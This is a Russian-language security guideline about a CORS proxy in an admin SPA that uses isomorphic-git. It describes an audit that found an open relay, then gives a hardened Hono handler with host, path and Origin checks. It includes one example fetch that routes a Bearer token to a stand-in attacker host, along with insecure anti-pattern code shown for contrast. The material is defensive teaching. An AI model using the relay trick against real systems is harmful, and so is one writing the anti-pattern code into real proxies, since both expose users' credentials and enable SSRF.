---
title: 'Прокси либо фиксирует цели, либо это открытый релей'
category: platform
summary: 'Любой серверный прокси, который собирает upstream-URL из запроса, обязан держать белый список хостов и путей, проверять Origin и срезать куки — иначе он пересылает учётные данные ваших пользователей кому угодно.'
principle: 'Перед запросом прокси проверяет три вещи: целевой хост (белый список), целевой путь (самый узкий шаблон, обслуживающий фичу) и Origin вызывающей стороны; куки он срезает, а заголовки авторизации пересылает только на зафиксированный хост.'
severity: non-negotiable
tags: [platform, proxy, ssrf, cors, workers, security]
sources:
  - project: 'админ-SPA для управления контентом'
    date: 2026-06-11
    note: 'Встроенный CORS-прокси для isomorphic-git уехал в релиз без фиксации хоста, которая была у его отдельного предшественника; аудит нашёл открытый релей, пересылавший Authorization на произвольные хосты.'
related:
  - platform/cross-origin-auth-survives-cookie-blocking
  - error-handling/always-check-res-ok
order: 5
updated: 2026-06-11
---

Браузер не может говорить с GitHub по git smart-HTTP напрямую: на этих эндпоинтах
GitHub не отдаёт CORS-заголовки, поэтому админ-SPA, гоняющая isomorphic-git в
Service Worker, нуждается в крошечном серверном прокси. Прокси получает
`/api/cors/github.com/owner/repo/info/refs`, запрашивает
`https://github.com/owner/repo/info/refs` и отражает обратно CORS-заголовки.
Около двадцати строк на Hono.

Аудит безопасности админ-SPA для управления контентом (2026-06-11) нашёл проблему.
Выкаченный в прод прокси собирал цель как `https://${path}` прямо из пути запроса
без всякой проверки, отражал любой заголовок `Origin` и копировал в upstream-запрос
**каждый** входящий заголовок, включая `Authorization` и `Cookie`. Один этот
эндпоинт открыл сразу три атаки:

- **Кража учётных данных.** `fetch('https://admin.example/api/cors/attacker.tld/x',
  {headers: {Authorization: 'Bearer ' + token}})` — воркер доставляет
  токен на сервер атакующего.
- **SSRF / анонимизирующий релей.** Исходящий запрос уходит от edge-воркера. Любой
  сторонний API, любая внутренняя поверхность, достижимая из этой сети, получает
  воркер бесплатным прокси перед собой.
- **Межсайтовое злоупотребление.** Раз `Access-Control-Allow-Origin` отражается,
  любой сайт, открытый посетителем, может рулить прокси из его браузера.

У отдельного воркера, который этот код заменил, фиксация
хоста и белый список Origin **были**. Обе защиты исчезли, когда прокси переехал в
основное приложение, потому что никто не пересобрал модель угроз для «того же кода,
но смонтированного на /api». Проверяйте перенос так же, как проверяли оригинал.

## Как применять

Зафиксируйте все три измерения в коде, прямо там, где происходит запрос, а не в
комментарии:

```ts
// Narrowest pattern that serves the feature: git smart-HTTP only.
const GIT_SMART_HTTP =
  /^github\.com\/[\w.-]+\/[\w.-]+\/(info\/refs|git-upload-pack|git-receive-pack)$/

const ALLOWED_ORIGINS = new Set([
  'https://admin.example.org',
  'https://dev-admin.example.org',
])

export const corsProxy = async (c: Context): Promise<Response> => {
  const origin = c.req.header('Origin')
  if (origin !== undefined && !ALLOWED_ORIGINS.has(origin))
    return new Response('Origin not allowed', { status: 403 })
  const path = c.req.path.replace('/api/cors/', '')
  if (!GIT_SMART_HTTP.test(path))
    return new Response('Target not allowed', { status: 403 })
  const headers = new Headers(c.req.raw.headers)
  headers.delete('host')
  headers.delete('cookie') // session cookie must never reach the upstream
  return fetch(`https://${path}${new URL(c.req.url).search}`, {
    method: c.req.method,
    headers,
  })
}
```

Регулярка по пути работает за двоих. Она фиксирует **хост** (строка обязана
начинаться с `github.com/`) и **форму пути** (только те три эндпоинта, которые
isomorphic-git реально вызывает). `Authorization` всё так же проходит — в этом вся
работа прокси, — но дотянуться он может лишь до зафиксированного хоста.

## Антипаттерны

```ts
// Open relay: host comes from the attacker.
const target = `https://${c.req.path.replace('/api/cors/', '')}`

// Reflecting any origin: every website can use your proxy.
out.headers.set('Access-Control-Allow-Origin', c.req.header('Origin') ?? '*')

// Forwarding the full header set: cookies and auth go wherever the path says.
const headers = new Headers(c.req.raw.headers)
```

Первый сам о себе заявит, когда ваш воркер всплывёт в чьём-нибудь разборе SSRF.
Два других не дают вам ничего: утечка через слишком разрешающий прокси не порождает
ошибки на вашей стороне, так что может работать незаметно.

## Контроль

Юнит-тесты тут дёшевы и прямолинейны. Проверьте, что чужой хост отдаёт 403 *и мок
fetch ни разу не вызвался*, что github-путь вне smart-HTTP отдаёт 403 и что `Cookie`
срезается, а `Authorization` остаётся. Держите белый список в отдельном модуле,
чтобы тесты читались как спецификация безопасности.
